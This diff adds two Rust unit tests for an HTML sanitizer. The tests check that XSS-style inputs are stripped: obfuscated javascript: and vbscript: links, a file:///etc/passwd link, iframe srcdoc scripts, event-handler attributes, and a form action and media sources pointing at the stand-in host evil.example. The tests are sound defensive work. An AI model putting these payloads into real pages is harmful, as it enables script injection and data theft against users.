@@ -227,6 +227,68 @@ mod tests {
     }
 
     #[test]
+    fn strips_obfuscated_and_browser_only_link_schemes() {
+        let sanitized = sanitize_html_body(
+            HtmlRenderingPolicy::default(),
+            concat!(
+                "<p>Obfuscated links</p>",
+                "<a href=\"JaVaScRiPt:alert(1)\">mixed case javascript</a>",
+                "<a href=\"&#x6a;avascript:alert(1)\">entity javascript</a>",
+                "<a href=\"blob:https://example.com/id\">blob link</a>",
+                "<a href=\"vbscript:msgbox(1)\">vbscript link</a>",
+                "<a href=\"file:///etc/passwd\">file link</a>",
+                "<a href=\"https://example.com/ok\">safe link</a>"
+            ),
+            None,
+            16 * 1024,
+        )
+        .expect("sanitization should succeed")
+        .expect("sanitized html should remain");
+
+        assert!(sanitized
+            .body_html
+            .contains("href=\"https://example.com/ok\""));
+        assert!(!sanitized.body_html.contains("href=\"JaVaScRiPt:"));
+        assert!(!sanitized.body_html.contains("href=\"javascript:"));
+        assert!(!sanitized.body_html.contains("href=\"blob:"));
+        assert!(!sanitized.body_html.contains("href=\"vbscript:"));
+        assert!(!sanitized.body_html.contains("href=\"file:"));
+    }
+
+    #[test]
+    fn strips_scriptable_embedding_and_autofocus_payloads() {
+        let sanitized = sanitize_html_body(
+            HtmlRenderingPolicy::default(),
+            concat!(
+                "<p>Visible V4 text</p>",
+                "<iframe srcdoc=\"<script>alert(1)</script>\">srcdoc text</iframe>",
+                "<details open ontoggle=\"alert(1)\"><summary>toggle</summary></details>",
+                "<input autofocus onfocus=\"alert(1)\" value=\"credential\">",
+                "<button formaction=\"https://evil.example/post\">submit</button>",
+                "<video poster=\"https://evil.example/poster.png\"><source src=\"https://evil.example/movie.mp4\"></video>",
+                "<audio src=\"https://evil.example/sound.mp3\"></audio>"
+            ),
+            None,
+            16 * 1024,
+        )
+        .expect("sanitization should succeed")
+        .expect("sanitized html should remain");
+
+        assert!(sanitized.body_html.contains("Visible V4 text"));
+        assert!(!sanitized.body_html.contains("<iframe"));
+        assert!(!sanitized.body_html.contains("srcdoc"));
+        assert!(!sanitized.body_html.contains("<details"));
+        assert!(!sanitized.body_html.contains("<input"));
+        assert!(!sanitized.body_html.contains("<button"));
+        assert!(!sanitized.body_html.contains("<video"));
+        assert!(!sanitized.body_html.contains("<audio"));
+        assert!(!sanitized.body_html.contains("<source"));
+        assert!(!sanitized.body_html.contains("autofocus"));
+        assert!(!sanitized.body_html.contains("onfocus"));
+        assert!(!sanitized.body_html.contains("evil.example"));
+    }
+
+    #[test]
     fn strips_scriptable_attributes_forms_remote_fetch_surfaces_and_comments() {
         let sanitized = sanitize_html_body(
             HtmlRenderingPolicy::default(),
